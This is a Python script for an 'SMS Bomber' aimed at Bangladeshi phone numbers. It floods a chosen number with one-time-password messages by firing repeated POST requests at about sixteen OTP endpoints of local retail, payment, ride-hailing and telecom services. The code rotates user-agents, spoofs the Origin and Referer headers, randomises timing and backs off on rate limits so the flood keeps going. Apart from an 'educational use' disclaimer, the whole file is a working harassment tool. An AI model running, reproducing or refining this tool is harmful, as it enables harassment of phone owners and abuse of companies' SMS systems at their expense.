import requests
import json
import time
import random
import sys
import os
from datetime import datetime

# Hacker-style ASCII art
HACKER_ART = """
          ____  __  _______ ____ ___  ____  ____  
         / ___||  \/  | ____|  _ \\  _ \\ ___ \\ 
        \\___ \\| |\\/| |  _| | | | | | | |  _  /
         ___) | |  | | |___| |_| | |_| | | \\ \\
        |____/|_|  |_|_____|____/ \\___/|_|  \\_\\
        
        === SM CORPORATE 🍁 SMS Bomber ===
        Coded by: SM CORPORATE Team
        For Educational Use Only!
"""

# List of APIs (all POST, Bangladeshi-focused)
APIs = [
    {"name": "Ostad OTP", "url": "https://ostad.com.bd/api/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Chaldal OTP", "url": "https://chaldal.com/api/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Sheba.xyz OTP", "url": "https://sheba.xyz/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Bikroy OTP", "url": "https://bikroy.com.bd/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Daraz OTP", "url": "https://daraz.com.bd/api/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Nagad OTP", "url": "https://www.nagad.com.bd/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Pathao OTP", "url": "https://pathao.com/api/otp/send", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Foodpanda OTP", "url": "https://www.foodpanda.com.bd/api/v2/otp/send", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Pickaboo OTP", "url": "https://www.pickaboo.com/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "ShopUp OTP", "url": "https://www.shopup.com.bd/api/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Meena Bazar OTP", "url": "https://meenabazar.com.bd/api/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "PriyoShop OTP", "url": "https://www.priyoshop.com/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Evaly OTP", "url": "https://evaly.com.bd/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "AjkerDeal OTP", "url": "https://ajkerdeal.com/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Grameenphone OTP", "url": "https://grameenphone.com.bd/api/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Robi OTP", "url": "https://robi.com.bd/api/otp", "method": "POST", "data": {"phone": "{number}"}},
]

# Random User-Agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
]

def clear_screen():
    os.system("clear" if os.name == "posix" else "cls")

def validate_phone(phone):
    return phone.isdigit() and len(phone) == 11 and phone.startswith("01")

def format_phone_number(api_name, phone):
    if api_name in ["Grameenphone OTP", "Robi OTP"]:
        return phone if phone.startswith("01") else "0" + phone
    return phone

def send_request(api, phone):
    formatted_phone = format_phone_number(api["name"], phone)
    url = api["url"]
    data = json.loads(json.dumps(api["data"]).replace("{number}", formatted_phone))
    headers = {
        "Content-Type": "application/json",
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json, text/plain, */*",
        "Origin": "https://www.example.com",
        "Referer": "https://www.example.com/",
    }

    try:
        response = requests.post(url, json=data, headers=headers, timeout=10)
        status = "Success" if response.status_code < 400 else f"Failed (Status: {response.status_code})"
        return {"success": response.status_code < 400, "status": status}
    except requests.RequestException as e:
        return {"success": False, "status": f"Error: {str(e)}"}

def main():
    clear_screen()
    print(HACKER_ART)
    
    # Input phone number
    phone = input("Enter Bangladeshi phone number (e.g., 01712345678): ").strip()
    if not validate_phone(phone):
        print("Invalid Bangladeshi number! Must be 11 digits starting with 01.")
        input("Press Enter to exit...")
        return

    # Input message count
    try:
        count = int(input("Enter number of messages (1-100): ").strip())
        if not 1 <= count <= 100:
            raise ValueError
    except ValueError:
        print("Invalid message count! Must be 1-100.")
        input("Press Enter to exit...")
        return

    # Input delay
    try:
        delay = float(input("Enter delay between requests (seconds, e.g., 2): ").strip())
        if delay < 0:
            raise ValueError
    except ValueError:
        print("Invalid delay! Must be a non-negative number.")
        input("Press Enter to exit...")
        return

    print(f"\nStarting SMS bombing to {phone} with {count} messages (delay: {delay}s)...")
    total_requests = len(APIs) * count
    current_request = 0

    for i in range(count):
        random.shuffle(APIs)  # Randomize API order
        for api in APIs:
            result = send_request(api, phone)
            current_request += 1
            progress = (current_request / total_requests) * 100
            status = f"[{current_request}/{total_requests}] {api['name']}: {result['status']}"
            print(f"{status} | Progress: {progress:.1f}%")

            if not result["success"] and "429" in result["status"]:
                print("Rate limit detected. Pausing for 10 seconds...")
                time.sleep(10)
            else:
                time.sleep(delay + random.uniform(0, 1))  # User delay + random 0-1s

        if i < count - 1:
            time.sleep(random.uniform(5, 10))  # Delay between rounds

    print("\nSMS bombing completed successfully!")
    input("Press Enter to exit...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nStopped by user.")
        sys.exit(0)
